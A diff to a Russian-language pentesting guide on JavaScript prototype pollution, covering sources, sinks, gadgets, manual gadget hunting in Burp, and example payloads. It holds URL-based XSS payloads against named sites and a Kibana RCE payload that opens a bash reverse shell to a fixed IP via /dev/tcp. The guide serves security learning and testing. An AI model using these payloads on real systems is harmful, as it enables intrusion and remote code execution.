@@ -23,7 +23,36 @@
 
 # Методология
 
-В JavaScript прототипы — это то, что позволяет объектам наследовать функции от других объектов. Если злоумышленник может добавить или изменить свойства `Object.prototype`, он может повлиять на все объекты, которые наследуются от этого прототипа, что потенциально может привести к различным видам угроз безопасности.
+> В JavaScript прототипы — это то, что позволяет объектам наследовать функции от других объектов. Если пользователь может добавить или изменить свойства `Object.prototype`, он может повлиять на все объекты, которые наследуются от этого прототипа, что потенциально может привести к различным видам угроз безопасности.
+
+* **эксплуатация требует следующих ключевых компонентов:**
+
+1.  **Источник Prototype Pollution** — это любой ввод, который позволяет отравить объекты прототипа произвольными свойствами.
+*   URL-адрес через строку запроса (query) или фрагмента (hash)
+*   Ввод на основе JSON
+*   Веб-сообщения (web messages)
+2.  **Приемник** — функция JavaScript или элемент DOM, которые позволяют выполнить произвольный код.
+```javascript
+Основные синки в JavaScript:
+
+//HTML-синки
+element.innerHTML = userInput;
+document.write(userInput);
+element.outerHTML = userInput;
+
+// JavaScript-синки
+eval(userInput);
+setTimeout(userInput, 100);
+Function(userInput);
+
+// URL-синки
+location.href = userInput;
+window.open(userInput);
+
+// Атрибуты
+element.setAttribute('onload', userInput);
+```
+3.  **Эксплуатируемый гаджет** — это любое свойство, которое передается в приемник без надлежащей фильтрации или очистки.
 
 ```javascript
 var myDog = new Dog();
@@ -39,7 +68,7 @@ myDog["__proto__"];
 
 ### Примеры
 
-Представьте, что приложение использует объект для хранения настроек конфигурации, например:
+Если приложение использует объект для хранения настроек конфигурации, например:
 
 ```javascript
 let config = {
@@ -64,7 +93,7 @@ Object.prototype.isAdmin = true;
 
 ## Загрязнение прототипа через JSON-ввод
 
-Вы можете получить доступ к прототипу любого объекта через магическое свойство `__proto__`. Функция `JSON.parse()` в JavaScript используется для разбора JSON-строки и преобразования ее в объект JavaScript. Обычно это функция-сток (sink), где может произойти загрязнение прототипа.
+Можно получить доступ к прототипу любого объекта через магическое свойство `__proto__`. Функция `JSON.parse()` в JavaScript используется для разбора JSON-строки и преобразования ее в объект JavaScript. Обычно это функция-сток (sink), где может произойти загрязнение прототипа.
 
 ```json
 {
@@ -103,7 +132,7 @@ Object.prototype.isAdmin = true;
 
 Примеры полезных нагрузок для загрязнения прототипа, найденных в реальных условиях.
 
-```
+```python
 https://victim.com/#a=b&__proto__[admin]=1
 https://example.com/#__proto__[xxx]=alert(1)
 http://server/servicedesk/customer/user/signup?__proto__.preventDefault.__proto__.handleObj.__proto__.delegateTarget=%3Cimg/src/onerror=alert(1)%3E
@@ -115,14 +144,14 @@ https://www.apple.com/shop/buy-watch/apple-watch?a[constructor][prototype]=image
 
 В зависимости от того, выполняется ли загрязнение прототипа на стороне клиента (CSPP) или на стороне сервера (SSPP), последствия будут различаться.
 
-*   **Удаленное выполнение команд:** RCE в Kibana (CVE-2019-7609)
+*   **Удаленное выполнение команд:** [RCE в Kibana (CVE-2019-7609)](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
 
-    ```
+    ```python
     .es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')
     .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
     ```
 
-*   **Удаленное выполнение команд:** RCE с использованием гаджетов EJS
+*   **Удаленное выполнение команд:** [RCE с использованием гаджетов EJS](https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce)
 
     ```json
     {
@@ -133,13 +162,13 @@ https://www.apple.com/shop/buy-watch/apple-watch?a[constructor][prototype]=image
     }
     ```
 
-*   **Отраженный XSS:** Reflected XSS on www.hackerone.com via Wistia embed code - #986386
-*   **Обход на стороне клиента:** Prototype pollution – and bypassing client-side HTML sanitizers
+*   **Отраженный XSS:** [Reflected XSS on www.hackerone.com via Wistia embed code - #986386](https://hackerone.com/reports/986386)
+*   **Обход на стороне клиента:** [Prototype pollution – and bypassing client-side HTML sanitizers](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)
 *   **Отказ в обслуживании (Denial of Service)**
 
 ## Полезные нагрузки для загрязнения прототипа
 
-```
+```python
 Object.__proto__["evilProperty"]="evilPayload"
 Object.__proto__.evilProperty="evilPayload"
 Object.constructor.prototype.evilProperty="evilPayload"
@@ -157,4 +186,25 @@ __proto__.baaebfc = baaebfc
 
 **"Гаджет"** в контексте уязвимостей обычно относится к фрагменту кода или функциональности, которые могут быть использованы во время атаки. Когда мы говорим о **"гаджете для загрязнения прототипа"**, мы имеем в виду конкретный путь выполнения кода, функцию или возможность приложения, которые восприимчивы к атаке через загрязнение прототипа или могут быть использованы через нее.
 
-Вы можете либо создать свой собственный гаджет, используя часть исходного кода с помощью **yeswehack/pp-finder**, либо попытаться использовать уже обнаруженные гаджеты из репозиториев **yuske/server-side-prototype-pollution** или **BlackFan/client-side-prototype-pollution**.
+Можно либо создать свой собственный гаджет, используя часть исходного кода с помощью [yeswehack/pp-finder](https://github.com/yeswehack/pp-finder), либо попытаться использовать уже обнаруженные гаджеты из репозиториев [yuske/server-side-prototype-pollution](https://github.com/yuske/server-side-prototype-pollution) или [BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution).
+
+### Поиск гаджетов на стороне клиента вручную
+
+1.  Просмотреть исходный код и определите любые свойства, используемые приложением или любыми импортированными им библиотеками.
+2.  В Burp перехвати ответ, содержащий JavaScript, который необходимо протестировать.
+3.  Добавь оператор `debugger;` в начало скрипта, затем перешли все оставшиеся запросы и ответы.
+4.  В браузере Burp перейди на страницу, на которую загружается целевой скрипт. Оператор `debugger` приостанавливает выполнение скрипта.
+5.  Пока скрипт еще приостановлен, переключись на консоль и введи следующую команду:
+    ```javascript
+    Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
+        get() {
+            console.trace();
+            return 'polluted';
+        }
+    })
+    ```
+6.  Свойство добавляется в глобальный `Object.prototype`, и браузер будет записывать трассировку стека в консоль всякий раз, когда к нему обращаются.
+7.  Нажми кнопку для продолжения выполнения скрипта и следите за консолью. Если появится трассировка стека, это подтверждает, что к свойству где-то в приложении был доступ.
+8.  Разверните трассировку стека и используйте предоставленную ссылку, чтобы перейти к строке кода, где происходит чтение свойства.
+9.  Используя элементы управления отладчика браузера, пройдите по шагам выполнения, чтобы увидеть, передается ли свойство в синк, такой как `innerHTML` или `eval()`.
+10. Повторите этот процесс для любых свойств, которые, по вашему мнению, являются потенциальными гаджетами.
